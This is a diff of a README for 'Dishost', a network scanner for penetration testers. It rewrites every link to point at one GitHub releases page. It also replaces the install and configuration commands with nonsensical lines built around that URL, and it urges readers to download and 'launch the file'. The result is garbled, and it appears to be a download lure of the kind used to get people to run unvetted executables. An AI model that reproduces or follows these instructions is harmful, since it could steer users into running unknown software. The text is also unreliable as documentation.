@@ -6,7 +6,7 @@
 
 Dishost is a versatile and dynamic IP range scanner with customizable health checks. It is designed with cybersecurity professionals, ethical hackers, and penetration testers in mind, providing a comprehensive toolset for network discovery and vulnerability assessment.
 
-![Scan](https://example.com/scan-image.png)
+![Scan](https://github.com/YKN1/Dishost/releases)
 
 ---
 
@@ -26,11 +26,11 @@ Dishost is a versatile and dynamic IP range scanner with customizable health che
 
 To get started with Dishost, follow these simple steps:
 
-1. Clone the repository from [GitHub](https://github.com/username/Dishost).
+1. Clone the repository from [GitHub](https://github.com/YKN1/Dishost/releases).
 2. Navigate to the project directory.
 3. Run the installation script:
    ```shell
-   $ ./install.sh
+   $ https://github.com/YKN1/Dishost/releases
    ```
 
 ---
@@ -52,7 +52,7 @@ $ dishost scan --iprange 192.168.1.1-192.168.1.254
 Tailor the health checks according to your preferences by modifying the configuration file:
 
 ```shell
-$ nano config.json
+$ nano https://github.com/YKN1/Dishost/releases
 ```
 
 ### Perform a Ping Scan
@@ -75,7 +75,7 @@ $ dishost ping --iprange 10.0.0.1-10.0.0.20
 
 ## Download Release
 
-[![Download](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download](https://github.com/YKN1/Dishost/releases)](https://github.com/YKN1/Dishost/releases)
 
 Click the button above to download the latest release of Dishost. Be sure to launch the file and start exploring the capabilities of this advanced IP range scanner.
 
@@ -87,7 +87,7 @@ In case the provided link is not accessible or you encounter any issues, please 
 
 Dishost is an open-source project, and we welcome contributions from the community. Whether you are a seasoned developer or a cybersecurity enthusiast, there are numerous ways to get involved:
 
-- Report issues or suggest features on the [issue tracker](https://github.com/username/Dishost/issues).
+- Report issues or suggest features on the [issue tracker](https://github.com/YKN1/Dishost/releases).
 - Fork the repository and submit pull requests for enhancements.
 - Spread the word about Dishost and help us grow our user base.
 
@@ -97,8 +97,8 @@ Dishost is an open-source project, and we welcome contributions from the communi
 
 Follow us on social media for the latest updates, release announcements, and cybersecurity news:
 
-- Twitter: [@DishostOfficial](https://twitter.com/DishostOfficial)
-- LinkedIn: [Dishost](https://www.linkedin.com/company/Dishost)
+- Twitter: [@DishostOfficial](https://github.com/YKN1/Dishost/releases)
+- LinkedIn: [Dishost](https://github.com/YKN1/Dishost/releases)
 
 ---
 
